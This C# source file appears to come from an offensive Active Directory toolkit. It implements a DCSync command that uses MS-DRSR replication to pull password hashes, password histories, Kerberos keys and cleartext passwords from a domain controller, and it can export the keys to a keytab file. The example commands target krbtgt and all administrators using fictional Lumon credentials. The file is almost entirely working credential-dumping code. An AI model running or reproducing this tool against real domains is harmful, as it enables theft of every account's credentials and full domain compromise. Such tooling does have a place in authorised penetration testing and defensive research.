using ms_drsr;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis;
using Titanis.Cli;
using Titanis.Ldap;
using Titanis.Msrpc.Msdrsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Kerberos;
using Titanis.Winterop.SamServer;
using Titanis.Winterop.Security;

namespace Dsrep;

/// <task category="Directory Replication;Enumeration">Replicate secret attributes from a domain controller (DCSync)</task>
/// <task category="Directory Replication;Enumeration">Export Kerberos keys for domain accounts to a .keytab file</task>
[Command]
[Description("Requests replica changes")]
[OutputRecordType(typeof(LdapEntry), DefaultOutputStyle = OutputStyle.List, DefaultFields = [
	nameof(LdapAttributeTypes.SAMAccountName),
	nameof(LdapAttributeTypes.GivenName),
	nameof(LdapAttributeTypes.UserPrincipalName),
	nameof(LdapAttributeTypes.InstanceType),
	nameof(LdapAttributeTypes.UserAccountControl),
	nameof(LdapAttributeTypes.DBCSPwd),
	nameof(LdapAttributeTypes.UnicodePwd),
	nameof(LdapAttributeTypes.LmPwdHistory),
	nameof(LdapAttributeTypes.NtPwdHistory),
	"cleartextPassword",
	"kerberosKeys",
	"kerberosOldKeys",
	])]
[DetailedHelpText(@"This command uses [MS-DRSR] to query attributes of an object by SID, GUID, distinguished name, LDAP query, or object name.

In addition to the standard attributes defined by Active Directory, you may query the special attributes kerberosKeys, kerberosOldKeys, or cleartextPassword.  When one of these attributes is specified, {0} implicitly queries supplementalCredentials and unpacks the credentials contained within.")]
[Example("Query for all objects with all attributes", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1", Tag = "milchick_all")]
[Example("Query credentials for krbtgt and milchick", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 krbtgt, \"CN=Seth Milchick,OU=Severed Floor,OU=Kier\\, PE,DC=lumon,DC=ind\" -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_name_dn")]
[Example("Query credentials for all administrators", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 (memberOf*=<SID=S-1-5-32-544>) -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory", Tag = "milchick_LdapQuery")]
public class ReplicateCommand : RpcCommand<DirectoryReplicationClient>
{
	[Parameter(After = nameof(RpcCommand.ServerName))]
	[Description("DN, GUID, or SID of object to retrieve")]
	public DsobjSpec[]? ObjectName { get; set; }

	[Parameter]
	[Description("Name of keytab file to export to")]
	public string? ExportKeytab { get; set; }

	private string[] GetLdapAttributes(string[] fieldNames)
	{
		List<string> attrOids = new(fieldNames.Length);
		HashSet<string> fieldsAdded = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		bool wantsSuppCreds = false;
		foreach (var name in fieldNames)
		{
			if (fieldsAdded.Add(name))
			{
				var attr = LdapAttributeTypes.TryGetByNameOrOid(name);
				if (attr != null)
					attrOids.Add(attr.Oid);
				else if (Array.IndexOf(SupplementalCredetialAttributes, name.ToUpper()) >= 0)
					wantsSuppCreds = true;
				else
					this.WriteWarning($"Attribute name '{name}' could not be resolved.");
			}
		}

		if (wantsSuppCreds)
			attrOids.Add(LdapAttributeTypes.SupplementalCredentials.Oid);
		if (!string.IsNullOrEmpty(this.ExportKeytab))
		{
			attrOids.Add(LdapAttributeTypes.ServicePrincipalName.Oid);
			attrOids.Add(LdapAttributeTypes.MsDSKeyVersionNumber.Oid);
		}

		return attrOids.ToArray();
	}

	private const string CleartextPasswordName = "cleartextPassword";
	private const string KerberosOldKeysName = "kerberosOldKeys";
	private const string KerberosKeysName = "kerberosKeys";
	private readonly static string[] SupplementalCredetialAttributes = [
		"KERBEROSKEYS",
		"KERBEROSOLDKEYS",
		"CLEARTEXTPASSWORD",
		];

	protected override async Task<int> RunAsync(DirectoryReplicationClient client, CancellationToken cancellationToken)
	{
		var dcInfos = await client.GetDcInfo(this.RpcParameters.Authentication.UserDomain, cancellationToken);
		if (dcInfos.Length == 0)
		{
			this.WriteError($"Unable to find any DCs.");
			return 1;
		}
		var dcInfo = dcInfos[0];

		string? realm = dcInfo.DnsHostName.Contains('.') ? dcInfo.DnsHostName.Substring(dcInfo.DnsHostName.IndexOf('.') + 1).ToUpper() : null;

		LdapClient? ldapClient = null;



		var outputAttrs = GetLdapAttributes(this.OutputFields);
		var objSpecs = this.ObjectName;
		if (objSpecs.IsNullOrEmpty())
		{
			objSpecs = [new DsobjSpec(LdapFilter.Parse("(objectClass=*)"))];
		}

		var kt = new KeytabFile();
		List<KeytabEntry> keytabEntries = kt.Entries;

		foreach (var objSpec in objSpecs)
		{
			var objName = objSpec.Dsname;
			if (objName is not null)
			{
				await this.ReplicateObjects(client, dcInfo, outputAttrs, objName, realm, keytabEntries, cancellationToken);
			}
			else
			{
				ldapClient ??= await LdapClient.Connect(new DnsEndPoint(this.ServerName, 389), null, this.RequireService<ISocketService>(), this.RequireService<IClientCredentialService>(), cancellationToken);

				LdapSearchResult? result;
				var filter = objSpec.Filter ?? LdapFilter.Parse($"(anr={objSpec.Name})");
				result = await ldapClient.Search(new LdapQuery(ldapClient.DomainRoot, LdapSearchScope.Subtree, filter, []), cancellationToken);
				if (result.Entries.Length == 0)
					this.WriteWarning($"The LDAP query with filter '{objSpec.Filter.ToString()}' did not return any results");
				else
				{
					foreach (var entry in result.Entries)
					{
						await this.ReplicateObjects(client, dcInfo, outputAttrs, new DsName(Guid.Empty, null, entry.EntryName), realm, keytabEntries, cancellationToken);
					}
				}
			}
		}

		if (!string.IsNullOrEmpty(this.ExportKeytab))
		{
			if (kt.Entries.Count == 0)
				this.WriteWarning($"No keys collected; will not export empty keytab file.");
			else
			{
				var ktFile = this.FileAccessService.ResolveFsPath(this.ExportKeytab);
				byte[] ktBytes = kt.ToBytes();
				this.FileAccessService.WriteAllBytesTo(ktFile, ktBytes);
				this.WriteVerbose($"Wrote {ktBytes.Length} to {ktFile}.");
			}
		}

		return 0;
	}

	private async Task ReplicateObjects(DirectoryReplicationClient client, DomainControllerInfo dcInfo, string[] outputAttrs, DsName objName, string realm, List<KeytabEntry> keytabEntries, CancellationToken cancellationToken)
	{
		var objs = await client.GetNcChanges(dcInfo, objName, outputAttrs, 1, cancellationToken);
		foreach (var obj in objs)
		{
			var entry = obj.ToLdapEntry();

			AddKeytabEntries(entry, realm, keytabEntries);
			this.WriteRecord(entry);
		}
	}

	private void AddKeytabEntries(LdapEntry entry, string realm, List<KeytabEntry> keytabEntries)
	{
		var userName = entry[LdapAttributeTypes.SAMAccountName]?.Value as string;
		if (!string.IsNullOrEmpty(userName))
		{
			AddKeys(entry, new(userName), realm, keytabEntries);
		}

		var spns = entry[LdapAttributeTypes.ServicePrincipalName]?.Values;
		if (spns != null)
		{
			foreach (string spn in spns)
			{
				AddKeys(entry, new(userName), realm, keytabEntries);
			}
		}
	}

	private static void AddKeys(LdapEntry entry, SimplePrincipalName upn, string realm, List<KeytabEntry> keytabEntries)
	{
		// Current key
		{
			var key = entry[KerberosKeysName]?.Value as KerberosKeyInfo;
			if (key != null)
			{
				keytabEntries.Add(CreateKeytabEntry(realm, upn, key));
			}
		}
		// Old (and older) keys
		var oldKeys = entry[KerberosOldKeysName]?.Values;
		if (oldKeys != null)
		{
			for (int i = 0; i < oldKeys.Length; i++)
			{
				var key = (KerberosKeyInfo)oldKeys[i];
				keytabEntries.Add(CreateKeytabEntry(realm, upn, key));
			}
		}
	}

	private static KeytabEntry CreateKeytabEntry(string realm, SecurityPrincipalName spn, KerberosKeyInfo key)
	{
		return new KeytabEntry(spn, realm, 0, key.Kvno ?? 0, (EType)key.KeyType, key.Bytes);
	}
}

[TypeConverter(typeof(DsobjSpecConverter))]
public class DsobjSpec
{
	public DsobjSpec(DsName dsname)
	{
		this.Dsname = dsname;
	}
	public DsobjSpec(LdapFilter filter)
	{
		this.Filter = filter;
	}
	public DsobjSpec(string name)
	{
		this.Name = name;
	}

	public DsName? Dsname { get; }
	public LdapFilter? Filter { get; }
	public string? Name { get; }
}

public class DsobjSpecConverter : TypeConverter
{
	public override bool CanConvertFrom(ITypeDescriptorContext? context, Type sourceType) => (sourceType == typeof(string)) || base.CanConvertFrom(context, sourceType);
	public override object? ConvertFrom(ITypeDescriptorContext? context, CultureInfo? culture, object value)
	{
		if (value is string str)
		{
			if (str.StartsWith('('))
				return new DsobjSpec(LdapFilter.Parse(str));
			else if (DsName.TryParse(str, out var dsName))
				return new DsobjSpec(dsName);
			else
				return new DsobjSpec(str);
		}
		else
			return base.ConvertFrom(context, culture, value);
	}
}
